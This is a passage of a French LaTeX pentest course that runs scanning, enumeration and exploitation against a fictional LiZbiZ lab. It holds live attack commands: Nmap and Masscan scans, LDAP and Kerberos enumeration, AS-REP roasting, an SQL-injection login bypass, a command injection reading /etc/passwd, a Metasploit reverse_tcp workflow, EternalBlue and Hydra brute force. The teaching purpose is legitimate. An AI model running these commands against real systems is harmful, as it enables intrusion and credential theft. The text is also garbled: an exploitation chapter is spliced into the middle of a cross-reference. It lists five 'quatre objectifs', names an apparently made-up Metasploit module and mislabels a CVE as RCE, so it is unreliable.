    \item Les administrateurs système (cibles privilégiées).
    \item Les technologies utilisées (ex: "Administrateur Windows Server 2019 chez LiZbiZ").
    \item La structure hiérarchique.
\end{itemize}

\subsubsection{theHarvester}
Outil automatisé pour collecter emails, sous-domaines et noms d'hôtes à partir de multiples sources publiques.

\begin{lstlisting}[language=bash, caption=Utilisation de theHarvester]
theharvester -d lizbiz.com -l 500 -b google,linkedin
# -d : domaine
# -l : limite de resultats
# -b : source (moteur de recherche)
\end{lstlisting}

% ------------------------------------------------------------------------------
\section{Analyse de Métadonnées}
% ------------------------------------------------------------------------------

Les documents publics (PDF, Word, Images) publiés sur le site web contiennent souvent des métadonnées invisibles.

\subsection{ExifTool}
\begin{boxdef}
\textbf{Métadonnées :} Données cachées dans un fichier (Auteur, Logiciel utilisé, Date de création, Chemin du fichier source).
\end{boxdef}

\begin{boxlizbiz}
\textbf{Analyse LiZbiZ :}
Téléchargez le document "Rapport Annuel LiZbiZ.pdf". Utilisez \texttt{exiftool} pour l'analyser.
\begin{lstlisting}[language=bash]
exiftool rapport_lizbiz.pdf
# Resultat : "Creator Tool: Microsoft Word 2016", 
# "Author: Admin-IT". 
# Indice : Le compte "Admin-IT" existe probablement.
\end{lstlisting}
\end{boxlizbiz}

% Chapitre 4 — Scanning actif et énumération
% ==============================================================================
% Fichier     : chapitres/04_scanning_enum.tex
% Titre       : Scanning Actif et Énumération de Services
% Auteur      : MINKA MI NGUIDJOÏ Thierry Emmanuel
% ==============================================================================

\chapter{Scanning Actif et Énumération de Services}
\label{chap:scanning}

La phase de Reconnaissance Passive (Chapitre~\ref{chap:osint}) a fourni une
carte de la surface d'attaque externe sans contact direct avec la cible. Nous
entrons maintenant dans la phase de \termecle{Scanning Actif} : contrairement
à l'\sigle{OSINT}, cette phase \textbf{génère du trafic réseau vers la cible}
et est donc détectable par les systèmes de sécurité (Firewalls, \sigle{IDS}/\sigle{IPS},
\sigle{SIEM}). Elle doit être menée dans la fenêtre temporelle définie par les
\sigle{ROE} (Section~\ref{sec:roe}).

\begin{boxinfo}
\textbf{MITRE ATT\&CK, Tactiques associées :}
Le scanning actif couvre principalement la tactique \sigle{TA0043}
(\textit{Reconnaissance}), avec les techniques T1595
(\textit{Active Scanning}), T1595.001 (\textit{Scanning IP Blocks}),
T1595.002 (\textit{Vulnerability Scanning}) et T1046
(\textit{Network Service Discovery}).
\end{boxinfo}

% ==============================================================================
\section{Objectifs du Scanning}
\label{sec:scanning_objectifs}
% ==============================================================================

Le scanning actif poursuit quatre objectifs complémentaires, chacun alimentant
directement la phase d'exploitation :

\begin{itemize}
    \item \textbf{Discovery :} Quelles machines sont actives et joignables
          sur le réseau cible ?
    \item \textbf{Port Scanning :} Quels ports (services) sont ouverts sur
          ces machines ?
    \item \textbf{Service Detection :} Quelle application et quelle version
          tournent derrière chaque port ouvert ?
    \item \textbf{OS Fingerprinting :} Quel système d'exploitation est utilisé
         , et quelle version précise ?
    \item \textbf{Vulnerability Mapping :} Quelles \sigle{CVE} connues
          s'appliquent aux services et versions détectés ?
\end{itemize}

% ==============================================================================
\section{Découverte d'Hôtes (\textit{Host Discovery})}
\label{sec:host_discovery}
% ==============================================================================

Avant de scanner les ports, il faut identifier les hôtes actifs. Envoyer un
scan de ports complet vers une plage de 254 adresses dont 200 sont éteintes
est une perte de temps considérable.

\subsection{Techniques de Découverte}

Nmap implémente plusieurs méthodes de découverte, chacune adaptée à un
contexte réseau différent.

\begin{table}[htbp]
\centering
\caption{Techniques de découverte d'hôtes Nmap}
\label{tab:host_discovery}
\begin{tabular}{p{3.5cm}p{4.5cm}p{5.5cm}}
\toprule
\textbf{Technique} & \textbf{Mécanisme} & \textbf{Contexte d'usage} \\
\midrule
ICMP Echo (\texttt{-PE})
    & Ping ICMP classique
    & Réseaux sans pare-feu, souvent bloqué en production \\
\addlinespace
ARP Scan (\texttt{-PR})
    & Requêtes ARP de couche 2
    & \sigle{LAN} local uniquement, indétectable par les \sigle{IDS} \\
\addlinespace
TCP SYN Ping (\texttt{-PS})
    & SYN sur port 80/443
    & Contourne les pare-feux filtrant ICMP \\
\addlinespace
TCP ACK Ping (\texttt{-PA})
    & ACK sur port 80
    & Détecte les hôtes derrière un \textit{stateful} firewall \\
\addlinespace
UDP Ping (\texttt{-PU})
    & UDP sur port 40125
    & Détecte les hôtes ne répondant qu'à UDP \\
\bottomrule
\end{tabular}
\end{table}

\begin{lstlisting}[language=bash, caption={Découverte d'hôtes, techniques combinées}]
# Scan ARP sur le LAN (rapide, fiable, indétectable IDS)
nmap -sn -PR 192.168.10.0/24

# Ping scan multi-technique (contourne les pare-feux)
nmap -sn -PS80,443 -PA80 -PE 192.168.10.0/24

# Decouverte rapide avec Masscan (10 000 paquets/seconde)
masscan 192.168.10.0/24 -p80,443,22,445 --rate=1000

# Sauvegarder les hotes actifs pour la suite
nmap -sn 192.168.10.0/24 -oG - | grep "Up" | \
    awk '{print $2}' > hotes_actifs.txt
\end{lstlisting}

\begin{boxinfo}
\textbf{Masscan vs Nmap :} \termecle{Masscan} est conçu pour la vitesse
(scanning de l'Internet complet en minutes) tandis que Nmap privilégie la
précision et les fonctionnalités avancées. En pratique, Masscan identifie
les hôtes actifs et les ports ouverts rapidement, puis Nmap réalise la
détection de service et \sigle{OS} sur les cibles confirmées.
\end{boxinfo}

% ==============================================================================
\section{Scan de Ports}
\label{sec:port_scanning}
% ==============================================================================

\subsection{Mécanismes TCP : Comprendre le 3-\textit{Way Handshake}}
\label{subsec:tcp_mecanique}

Pour saisir pourquoi les différents types de scans ont des propriétés de
furtivité différentes, il est indispensable de comprendre le mécanisme
d'établissement de connexion TCP.

\begin{boxinfo}
\textbf{3-Way Handshake TCP (connexion normale) :}
\begin{enumerate}
    \item Client → Serveur : \textbf{SYN} (demande d'ouverture de connexion)
    \item Serveur → Client : \textbf{SYN/ACK} (port ouvert, serveur prêt)
    \item Client → Serveur : \textbf{ACK} (confirmation, connexion établie)
\end{enumerate}
Si le port est fermé, le serveur répond \textbf{RST/ACK} à l'étape~2.
Si le port est filtré par un pare-feu, \textbf{aucune réponse} (ou ICMP
Port Unreachable).
\end{boxinfo}

\subsection{Types de Scans TCP}
\label{subsec:scan_types}

\begin{table}[htbp]
\centering
\caption{Comparatif des types de scans TCP/UDP}
\label{tab:scan_types}
\begin{tabular}{p{3cm}p{4.5cm}p{5.5cm}}
\toprule
\textbf{Type} & \textbf{Mécanisme} & \textbf{Caractéristiques} \\
\midrule
TCP Connect (\texttt{-sT})
    & Handshake complet (SYN → SYN/ACK → ACK)
    & Bruyant (logs complets), ne nécessite pas root \\
\addlinespace
SYN Scan (\texttt{-sS})
    & SYN → SYN/ACK → \textbf{RST} (connexion interrompue)
    & Furtif (demi-ouvert), rapide, nécessite root/sudo \\
\addlinespace
UDP Scan (\texttt{-sU})
    & Paquet UDP vide → ICMP Port Unreach. si fermé
    & Très lent, indispensable pour DNS (53), SNMP (161) \\
\addlinespace
NULL Scan (\texttt{-sN})
    & Paquet TCP sans flags
    & Contourne certains pare-feux ; invalide sur Windows \\
\addlinespace
FIN Scan (\texttt{-sF})
    & Paquet TCP FIN uniquement
    & Contourne \textit{stateless} firewalls ; invalide sur Windows \\
\addlinespace
XMAS Scan (\texttt{-sX})
    & Flags FIN+PSH+URG simultanés
    & Identique à FIN scan en termes d'évasion \\
\bottomrule
\end{tabular}
\end{table}

\subsection{Les Six États des Ports Nmap}
\label{subsec:port_states}

Nmap classifie les ports en six états distincts, la maîtrise de cette
taxonomie est essentielle pour interpréter correctement les résultats.

\begin{enumerate}
    \item \textbf{Open :} Une application accepte activement les connexions
          sur ce port, cible potentielle d'exploitation.
    \item \textbf{Closed :} Le port est accessible (pas de pare-feu) mais
          aucune application n'écoute, utile pour la détection \sigle{OS}.
    \item \textbf{Filtered :} Nmap ne peut déterminer si le port est ouvert
          car un pare-feu filtre les paquets sans répondre (\textit{drop}).
    \item \textbf{Unfiltered :} Accessible (répond au scan ACK) mais Nmap
          ne peut déterminer s'il est ouvert ou fermé.
    \item \textbf{Open|Filtered :} Nmap ne peut distinguer entre ouvert et
          filtré, typique du scan UDP et des scans furtifs.
    \item \textbf{Closed|Filtered :} Ne peut distinguer entre fermé et filtré
         , produit par le scan IPID Idle.
\end{enumerate}

\subsection{Commandes Nmap Essentielles}
\label{subsec:nmap_commands}

\begin{lstlisting}[language=bash, caption={Scan SYN, ports courants avec timing}]
# Scan SYN furtif sur les 100 ports les plus courants
nmap -sS -T4 --top-ports 100 192.168.10.10

# Scan complet des 65535 ports (plus lent mais exhaustif)
nmap -sS -T4 -p- 192.168.10.10

# Scan UDP sur les ports critiques
nmap -sU -T4 -p 53,67,69,161,123 192.168.10.10

# Templates de timing : T0 (paranoïaque) à T5 (insensé)
# T3 = defaut, T4 = rapide (labs), T2 = furtif (prod)
\end{lstlisting}

\begin{lstlisting}[language=bash, caption={Détection de version et OS, mécanismes}]
# Detection de version de service (-sV)
# Envoie des sondes specifiques a chaque service detecte
# ex: banner grabbing HTTP, interrogation SMTP EHLO, etc.
nmap -sV --version-intensity 5 192.168.10.10

# Detection d'OS (-O), necessite root
# Analyse les caracteristiques TCP/IP : ISN (Initial Sequence Number),
# taille de fenetre (Window Size), valeur TTL, bit DF (Don't Fragment),
# reponse a des paquets invalides (TCP timestamp, IP options)
nmap -O 192.168.10.10

# Scan complet recommande en pentest
nmap -sS -sV -O -sC -T4 --open 192.168.10.0/24 \
     -oA scan_lizbiz
# -sC : scripts par defaut (equivalent --script=default)
# --open : afficher uniquement les ports ouverts
# -oA : sauvegarder en 3 formats (nmap, xml, grepable)
\end{lstlisting}

\begin{boxinfo}
\textbf{Mécanisme d'OS Fingerprinting :} Nmap envoie une série de sondes
TCP/UDP/ICMP soigneusement choisies et analyse les réponses selon sept
critères : \textbf{\sigle{ISN}} (Initial Sequence Number, prévisibilité),
\textbf{Window Size} TCP, \textbf{\sigle{TTL}} initial, \textbf{bit DF}
(\textit{Don't Fragment}), comportement face aux \textit{TCP options} inconnues,
réponse aux paquets invalides, et comportement \sigle{ICMP}. La combinaison
de ces signatures est comparée à une base de plus de 5\,000 empreintes connues.
\end{boxinfo}

% ==============================================================================
\section{Scripts NSE, Nmap Scripting Engine}
\label{sec:nse}
% ==============================================================================

Le \termecle{NSE} (\textit{Nmap Scripting Engine}) permet d'étendre les
capacités de Nmap avec des scripts Lua. Il dispose de plus de 600 scripts
organisés en catégories.

\begin{table}[htbp]
\centering
\caption{Catégories NSE et usages en pentest}
\label{tab:nse_categories}
\begin{tabular}{p{2.5cm}p{4cm}p{6.5cm}}
\toprule
\textbf{Catégorie} & \textbf{Activation} & \textbf{Usage} \\
\midrule
\texttt{default}
    & \texttt{-sC}
    & Scripts sûrs, informatifs, banner grabbing, détection de protocoles \\
\addlinespace
\texttt{vuln}
    & \texttt{--script=vuln}
    & Détection de vulnérabilités connues (EternalBlue, Shellshock, Heartbleed) \\
\addlinespace
\texttt{auth}
    & \texttt{--script=auth}
    & Test de credentials par défaut sur les services \\
\addlinespace
\texttt{brute}
    & \texttt{--script=brute}
    & Attaques par dictionnaire sur SSH, FTP, HTTP-auth, LDAP \\
\addlinespace
\texttt{discovery}
    & \texttt{--script=discovery}
    & Énumération approfondie : partages SMB, DNS, SNMP \\
\addlinespace
\texttt{exploit}
    & \texttt{--script=exploit}
    & Exploitation directe (usage avec précaution en pentest) \\
\bottomrule
\end{tabular}
\end{table}

\begin{lstlisting}[language=bash, caption={Utilisation avancée des scripts NSE}]
# Scripts par defaut (recommande pour tout scan)
nmap -sC -sV 192.168.10.10

# Detection de vulnerabilites connues
nmap --script=vuln -p80,443,445,22 192.168.10.10
# Detecte : ms17-010 (EternalBlue), http-shellshock,
#           ssl-heartbleed, http-sql-injection, etc.

# Scripts SMB specifiques
nmap --script=smb-vuln-ms17-010 -p445 192.168.10.10
nmap --script=smb-enum-shares,smb-enum-users -p445 192.168.10.10
nmap --script=smb-security-mode -p445 192.168.10.10

# Scripts HTTP
nmap --script=http-title,http-server-header,http-methods \
     -p80,443,8080 192.168.10.10

# LDAP enumeration (port 389/636)
nmap --script=ldap-search,ldap-rootdse -p389 192.168.10.5
\end{lstlisting}

% ==============================================================================
\section{Énumération de Services}
\label{sec:service_enum}
% ==============================================================================

Une fois les ports ouverts et les versions identifiées, l'énumération approfondie
extrait des informations exploitables : utilisateurs, configurations, partages,
politiques d'authentification.

\subsection{Énumération Web (Ports 80/443/8080)}
\label{subsec:web_enum}

L'énumération web vise à cartographier la surface d'application : répertoires
cachés, fichiers de configuration exposés, technologies utilisées, points d'entrée
de l'application.

\begin{lstlisting}[language=bash, caption={Énumération web, outils complémentaires}]
# Dirb, énumeration par dictionnaire (classique)
dirb http://lizbiz.local /usr/share/wordlists/dirb/common.txt

# Gobuster, plus rapide, multi-threadé, meilleur wordlist support
gobuster dir -u http://lizbiz.local \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,html,txt,bak,old,conf \
    -t 50 --no-error

# Feroxbuster, recursif, détecte les sous-répertoires automatiquement
feroxbuster -u http://lizbiz.local \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
    -x php,html,txt -r --depth 3

# Nikto, scanner de vulnérabilités web (configurations dangereuses,
#         fichiers sensibles, versions obsolètes, méthodes HTTP non
#         sécurisées, headers manquants)
nikto -h http://lizbiz.local -o nikto_lizbiz.html -Format htm
\end{lstlisting}

\begin{boxinfo}
\textbf{SecLists :} La collection \termecle{SecLists} (Daniel Miessler)
est la référence pour les wordlists de pentest. Elle inclut des listes
spécialisées par technologie (WordPress, Drupal, IIS, Tomcat) et par type
(répertoires, fichiers, paramètres, sous-domaines). Installation :
\texttt{apt install seclists} ou \texttt{git clone
https://github.com/danielmiessler/SecLists}.
\end{boxinfo}

\begin{boxlizbiz}
\textbf{Découverte Web LiZbiZ :}
\begin{lstlisting}[language=bash]
gobuster dir -u http://203.0.113.10 \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,txt,bak -t 50
\end{lstlisting}
\textbf{Résultats :}
\begin{itemize}
    \item \texttt{/backup/}, répertoire accessible en lecture (200)
    \item \texttt{/backup/old\_passwd.txt}, identifiants obsolètes
    \item \texttt{/admin/}, page de connexion administrative (200)
    \item \texttt{/config.php.bak}, sauvegarde de fichier de configuration (200)
\end{itemize}
\end{boxlizbiz}

\subsection{Énumération SMB (Ports 139/445)}
\label{subsec:smb_enum}

Le protocole \sigle{SMB} (\textit{Server Message Block}) est historiquement
l'un des services les plus riches en informations pour un attaquant interne.

\begin{lstlisting}[language=bash, caption={Énumération SMB complète}]
# Scripts NSE SMB
nmap --script=smb-enum-shares,smb-enum-users,smb-security-mode \
     -p445 192.168.10.20

# CrackMapExec, enumeration SMB en une commande
crackmapexec smb 192.168.10.0/24

# Enum4Linux-ng, outil dédié, agrège SMB + RPC + LDAP
enum4linux-ng -A 192.168.10.20

# Smbclient, navigation interactive dans les partages
smbclient -L //192.168.10.20 -N        # Lister les partages (null session)
smbclient //192.168.10.20/SYSVOL -N   # Acceder au partage SYSVOL

# Vérification de la vulnérabilité EternalBlue (MS17-010)
nmap --script=smb-vuln-ms17-010 -p445 192.168.10.20
\end{lstlisting}

\begin{boxalert}
\textbf{Null Session SMB :} Une connexion anonyme (\textit{null session})
sans identifiants vers un service SMB peut révéler la liste des utilisateurs,
les partages, les politiques de mots de passe et les groupes, sans aucune
authentification. Cette configuration, courante sur les systèmes anciens
(Windows Server 2003/XP), est mappée MITRE T1135
(\textit{Network Share Discovery}).
\end{boxalert}

\subsection{Énumération LDAP et Active Directory (Ports 389/636/3268)}
\label{subsec:ldap_enum}

L'énumération \sigle{LDAP} est critique dans les environnements Windows
Active Directory. Elle permet de cartographier les utilisateurs, groupes,
politiques et relations de confiance avant même d'exploiter la moindre
vulnérabilité.

\begin{lstlisting}[language=bash, caption={Énumération LDAP et Active Directory}]
# Requete LDAP anonyme (RootDSE, souvent accessible sans auth)
ldapsearch -H ldap://192.168.10.5 -x -s base namingcontexts

# Enumeration des utilisateurs (avec compte stagiaire)
ldapsearch -H ldap://192.168.10.5 \
    -x -D "stagiaire@lizbiz.local" -w "Password123" \
    -b "DC=lizbiz,DC=local" \
    "(objectClass=user)" sAMAccountName mail memberOf

# Enumeration des groupes privilegies
ldapsearch -H ldap://192.168.10.5 \
    -x -D "stagiaire@lizbiz.local" -w "Password123" \
    -b "DC=lizbiz,DC=local" \
    "(cn=Domain Admins)" member

# BloodHound, collecte complete de la topologie AD
# (sera detaille au Chapitre suivant)
bloodhound-python -u stagiaire -p Password123 \
    -d lizbiz.local -ns 192.168.10.5 -c all
\end{lstlisting}

\begin{boxlizbiz}
\textbf{Découverte LDAP LiZbiZ :}
Avec le compte \og{}stagiaire\fg{} fourni dans les \sigle{ROE}, l'énumération
\sigle{LDAP} révèle :
\begin{itemize}
    \item \textbf{47 utilisateurs} dont 3 comptes de service avec
          \sigle{SPN} configurés (cibles Kerberoasting).
    \item \textbf{Compte admin-it}, membre du groupe
          \og{}Domain Admins\fg{}.
    \item \textbf{Politique de mots de passe :} longueur minimale 8 chars,
          pas de verrouillage après échecs (brute force possible).
\end{itemize}
\end{boxlizbiz}

\subsection{Énumération Kerberos (Port 88)}
\label{subsec:kerb_enum}

Le service Kerberos expose des informations exploitables avant toute
authentification.

\begin{lstlisting}[language=bash, caption={Énumération Kerberos}]
# Kerbrute, enumeration des utilisateurs valides (sans authentification)
# Exploite le comportement du KDC : erreur différente pour compte inexistant
# vs mauvais mot de passe (T1589.001 dans MITRE)
kerbrute userenum -d lizbiz.local \
    /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
    --dc 192.168.10.5

# AS-REP Roasting, comptes sans pre-authentification Kerberos requise
# (GetNPUsers.py de la suite Impacket)
GetNPUsers.py lizbiz.local/ -usersfile users.txt \
    -no-pass -dc-ip 192.168.10.5
# Produit un hash AS-REP crackable hors-ligne avec hashcat
\end{lstlisting}

\subsection{Énumération SMTP (Port 25)}
\label{subsec:smtp_enum}

Les serveurs mail révèlent souvent des informations sur les comptes internes
via les commandes \sigle{SMTP} \texttt{VRFY} et \texttt{EXPN}.

\begin{lstlisting}[language=bash, caption={Énumération de comptes via SMTP}]
# Connexion manuelle
nc 192.168.10.50 25
# Puis : EHLO test
#        VRFY admin        → 250 OK si le compte existe
#        VRFY nonexistent  → 550 si inexistant

# Enumeration automatisée
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/\
    top-usernames-shortlist.txt -t 192.168.10.50

# Nmap NSE
nmap --script=smtp-commands,smtp-enum-users -p25 192.168.10.50
\end{lstlisting}

\subsection{Énumération DNS (Port 53)}
\label{subsec:dns_active}

Le transfert de zone \sigle{AXFR} a été abordé en phase passive. En phase
active, d'autres techniques complètent la cartographie DNS.

\begin{lstlisting}[language=bash, caption={Énumération DNS active}]
# Tentative de transfert de zone
dig axfr @192.168.10.5 lizbiz.local

# Brute force de sous-domaines (dnsx)
dnsx -d lizbiz.local \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Reverse lookup sur la plage interne
for ip in $(seq 1 20); do
    dig -x 192.168.10.$ip +short @192.168.10.5
done
\end{lstlisting}

% ==============================================================================
\section{Scan de Vulnérabilités Automatisé}
\label{sec:vuln_scan}
% ==============================================================================

Une fois les services cartographiés, les scanners de vulnérabilités croisent
les versions détectées avec les bases de données de failles connues (\sigle{CVE},
\sigle{NVD}, \sigle{ExploitDB}).

\subsection{Nessus et OpenVAS}
\label{subsec:nessus}

Ces scanners actifs envoient des sondes spécifiques pour détecter si un
service est vulnérable à une \sigle{CVE} précise, sans nécessairement
l'exploiter.

\begin{boxlizbiz}
\textbf{Résultat Nessus, LiZbiZ :}
Le scan signale :
\begin{itemize}
    \item \textbf{Critique (CVSS 9.8)} : Serveur web 203.0.113.10 —
          Apache~2.2.22 vulnérable à CVE-2012-0053 (\textit{httpOnly} cookie
          disclosure) et CVE-2012-0031 (RCE via \texttt{mod\_setenvif}).
    \item \textbf{Critique (CVSS 9.8)} : Port 445 (192.168.10.20) —
          MS17-010 EternalBlue détecté.
    \item \textbf{Élevé (CVSS 7.5)} : LDAP anonymous bind autorisé sur
          192.168.10.5.
\end{itemize}
Ces trois vecteurs seront exploités au Chapitre~\ref{chap:% ==============================================================================
% Fichier : 05_exploitation.tex
% Description : Vulnérabilités et Exploitation
% ==============================================================================

\chapter{Vulnérabilités et Exploitation}

Une fois la surface d'attaque cartographiée (Scanning), vient la phase d'\textbf{Exploitation}. L'objectif est de prouver qu'une vulnérabilité identifiée a un impact réel en réussissant à exécuter du code ou à extraire des données sur la cible.

\section{Concepts Fondamentaux de l'Exploitation}
% ------------------------------------------------------------------------------

\subsection{Le Trio de l'Attaque}

\begin{itemize}
    \item \textbf{Vulnérabilité :} La faille technique (ex: code mal écrit, configuration faible).
    \item \textbf{Exploit :} Le code ou la méthode utilisée pour abuser de la vulnérabilité.
    \item \textbf{Payload :} Le "fardeau" transporté par l'exploit pour exécuter une action sur la cible (ex: ouvrir un shell, créer un utilisateur).
\end{itemize}

\subsection{Types de Shells}

L'objectif ultime de l'exploitation est souvent d'obtenir un accès à distance (Shell).

\begin{table}[h!]
\centering
\begin{tabular}{p{3cm}p{5cm}p{4cm}}
    \toprule
    \textbf{Type} & \textbf{Fonctionnement} & \textbf{Usage} \\
    \midrule
    \textbf{Reverse Shell} & La cible se connecte à l'attaquant (Outbound). & Contourne les pare-feux (les connexions sortantes sont souvent autorisées). \\
    \textbf{Bind Shell} & La cible écoute sur un port, l'attaquant s'y connecte (Inbound). & Utile si aucun pare-feu ne bloque l'entrée. \\
    \textbf{Web Shell} & Script déposé sur le serveur web (ex: PHP). & Persistant, facile à utiliser via un navigateur. \\
    \bottomrule
\end{tabular}
\caption{Types de shells}
\end{table}

% ------------------------------------------------------------------------------
\section{Exploitation Web (OWASP Top 10)}
% ------------------------------------------------------------------------------

Les applications web sont souvent la porte d'entrée la plus facile.

\subsection{Injection SQL (SQLi)}

\begin{boxdef}
\textbf{SQLi :} Technique consistant à injecter du code SQL malveillant dans les entrées de l'application pour manipuler la base de données.
\end{boxdef}

\textbf{Types de SQLi :}
\begin{itemize}
    \item \textbf{In-Band (Classique) :} L'attaquant voit les résultats directement sur la page (Error based, Union based).
    \item \textbf{Blind (Aveugle) :} L'attaquant ne voit pas les données mais peut déduire la réponse via le comportement de la page (Boolean based, Time based).
\end{itemize}

\begin{boxlizbiz}
\textbf{Attaque LiZbiZ :}
Sur la page de connexion de LiZbiZ, le champ "Nom d'utilisateur" est vulnérable.
\begin{lstlisting}[language=SQL]
Payload : ' OR '1'='1' --
Resultat : La requete devient toujours vraie, connectant l'attaquant en tant qu'admin sans mot de passe.
\end{lstlisting}
Utilisation de \textbf{SQLMap} pour automatiser l'extraction de toute la base de données clients :
\begin{lstlisting}[language=bash]
sqlmap -u "http://lizbiz.local/login?id=1" --dump
\end{lstlisting}
\end{boxlizbiz}

\subsection{File Inclusion (LFI/RFI)}

\begin{itemize}
    \item \textbf{LFI (Local File Inclusion) :} Inclure des fichiers présents sur le serveur (ex: \texttt{/etc/passwd}) via un paramètre non filtré.
    \item \textbf{RFI (Remote File Inclusion) :} Inclure un fichier distant (ex: une backdoor PHP hébergée sur le serveur de l'attaquant).
\end{itemize}

\subsection{Command Injection}

Exécution de commandes système via une entrée utilisateur non nettoyée (ex: ping d'une IP).

\begin{lstlisting}[language=bash, caption=Injection de commande]
Entree : 127.0.0.1 ; cat /etc/passwd
Le serveur execute : ping 127.0.0.1 ; cat /etc/passwd
\end{lstlisting}

% ------------------------------------------------------------------------------
\section{Exploitation Système et Réseau}
% ------------------------------------------------------------------------------

\subsection{Le Framework Metasploit}

C'est l'outil standard pour l'exploitation de vulnérabilités réseaux et systèmes. Il centralise les exploits, les payloads et les encodeurs.

\begin{lstlisting}[language=bash, caption=Workflow Metasploit]
msfconsole
# 1. Chercher un exploit
search apache 2.2.22
# 2. Utiliser l'exploit
use exploit/multi/http/apache_mod_jpeg_overflow
# 3. Configurer la cible
set RHOSTS 192.168.1.10
set PAYLOAD php/meterpreter/reverse_tcp
# 4. Lancer l'attaque
exploit
\end{lstlisting}

\subsection{Exploitation de Services Connus}

\begin{itemize}
    \item \textbf{SSH (Port 22) :} Souvent protégé par mot de passe faible. Utilisation de \texttt{Hydra} pour le Brute Force.
    \begin{lstlisting}[language=bash]
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
    \end{lstlisting}
    \item \textbf{SMB (Port 445) :} Cible privilégiée. Exploitation de failles comme \textbf{EternalBlue (MS17-010)} ou \textbf{BlueKeep}.
\end{itemize}

\begin{boxlizbiz}
\textbf{Scénario LiZbiZ :}
Le scan a révélé un serveur Windows Server 2012 R2 non mis à jour (Port 445 ouvert).
L'attaquant utilise le module Metasploit \texttt{exploit/windows/smb/ms17\_010\_eternalblue}.
\textbf{Résultat :} Un shell "SYSTEM" (Administrateur maximum) est ouvert sur le serveur, donnant le contrôle total de la machine.
\end{boxlizbiz}

% ------------------------------------------------------------------------------
\section{Transfert de Fichiers (Post-Exploitation)}
% ------------------------------------------------------------------------------

Une fois un accès obtenu, il faut souvent uploader des outils (Mimikatz, scripts) sur la cible.

\begin{itemize}
    \item \textbf{Serveur HTTP simple :} \texttt{python3 -m http.server 8080} sur la machine attaquante, puis \texttt{wget} ou \texttt{certutil} sur la cible.
    \item \textbf{Netcat :} Transfert direct via socket.
\end{itemize}
}.
\end{boxlizbiz}

\subsection{Nuclei, Scanner de Templates}
\label{subsec:nuclei}

\termecle{Nuclei} (ProjectDiscovery) est un scanner de vulnérabilités moderne
basé sur des templates \sigle{YAML} communautaires. Il est plus léger et plus
personnalisable que Nessus pour les tests ciblés.

\begin{lstlisting}[language=bash, caption={Scan Nuclei ciblé}]
# Mise a jour des templates
nuclei -update-templates

# Scan sur une cible avec templates CVE
nuclei -u http://203.0.113.10 -t cves/ -severity critical,high

# Scan sur les templates de mauvaise configuration
nuclei -u http://203.0.113.10 -t misconfigurations/ -t exposures/

# Scan reseau complet
nuclei -l hotes_actifs.txt -t network/ -t cves/ -o nuclei_lizbiz.txt
\end{lstlisting}

% ==============================================================================
\section{Synthèse : Tableau de Bord Scanning LiZbiZ}
\label{sec:synthese_scanning}
% ==============================================================================

\begin{table}[htbp]
\centering
\caption{Synthèse du scanning, résultats LiZbiZ et vecteurs d'exploitation}
\label{tab:synthese_scanning}
\begin{tabular}{p{2.8cm}p{2.5cm}p{3cm}p{5cm}}
\toprule
\textbf{Cible} & \textbf{Port / Service} & \textbf{Version} & \textbf{Vecteur d'exploitation} \\
\midrule
203.0.113.10
    & 80/HTTP
    & Apache 2.2.22
    & CVE-2012-0031 (RCE) → Chap.~\ref{chap:exploit} \\
\addlinespace
203.0.113.10
    & 80/HTTP
    & PHP application
    & Injection SQL (login) → Chap.~\ref{chap:exploit} \\
\addlinespace
192.168.10.50
    & 80/HTTP
    & Intranet LiZbiZ
    & \texttt{/backup/old\_passwd.txt} → brute force \\
\addlinespace
192.168.10.20
    & 445/SMB
    & Windows Server 2012 R2
    & MS17-010 EternalBlue → Chap.~\ref{chap:exploit} \\
\addlinespace
192.168.10.5
    & 389/LDAP
    & Active Directory
    & Anonymous bind + 3 SPN (Kerberoasting) \\
\addlinespace
192.168.10.5
    & 88/Kerberos
    & Windows Server 2019
    & AS-REP Roasting (comptes sans pré-auth) \\
\addlinespace
192.168.10.50
    & 25/SMTP
    & Postfix 3.x
    & VRFY user enumeration → liste comptes \\
\bottomrule
\end{tabular}
\end{table}

\begin{boxlizbiz}
\textbf{Bilan du scanning LiZbiZ :}

La phase de scanning actif a transformé la carte de surface d'attaque
construite en \sigle{OSINT} en un inventaire précis de vecteurs exploitables :
\begin{enumerate}
    \item \textbf{Entrée externe} : Apache~2.2.22 (CVE) + injection SQL
          sur le formulaire de connexion → accès au serveur \sigle{DMZ}.
    \item \textbf{Mouvement latéral} : EternalBlue sur le serveur Windows
          interne → shell \sigle{SYSTEM}.
    \item \textbf{Accès à l'AD} : LDAP anonymous bind → cartographie
          complète + 3 comptes \sigle{SPN} pour Kerberoasting.
\end{enumerate}
Ces trois vecteurs constituent le scénario d'attaque du
Chapitre~\ref{chap:exploit}.
\end{boxlizbiz}

% ==============================================================================
\section*{Points Clés à Retenir}
% ==============================================================================

\begin{boxinfo}
\textbf{Ce qu'il faut retenir de ce chapitre :}
\begin{enumerate}
    \item Le scanning \textbf{génère du trafic} vers la cible et doit être
          mené dans les plages horaires des \sigle{ROE}.
    \item Le \textbf{SYN Scan} (\texttt{-sS}) est le standard : furtif,
          rapide, nécessite root.
    \item \textbf{Nmap} détecte l'\sigle{OS} via 7 critères TCP/IP
          (ISN, Window Size, TTL, DF bit…), pas par magie.
    \item Les \textbf{scripts NSE} (\texttt{-sC}, \texttt{--script=vuln})
          démultiplient la valeur d'un scan Nmap sans effort supplémentaire.
    \item L'énumération \textbf{LDAP/AD} avec un compte standard révèle
          une quantité massive d'informations exploitables.
    \item \textbf{Masscan} pour la vitesse, \textbf{Nmap} pour la précision :
          les deux sont complémentaires.
    \item Tout résultat de scan doit être \textbf{sauvegardé} (\texttt{-oA})
          avec hash SHA-256 pour la chaîne de custody.
\end{enumerate}
\end{boxinfo}

% ==============================================================================
\section*{Exercices Pratiques}
% ==============================================================================

\begin{boxexo}
\textbf{Exercice 4.1, Scan complet du lab LiZbiZ}

\medskip
\textbf{Prérequis :} Lab déployé (Exercice~1.1), Kali Linux opérationnelle.

\medskip
\textbf{Tâches :}
\begin{enumerate}
    \item Lancer une découverte d'hôtes sur \texttt{192.168.10.0/24} et
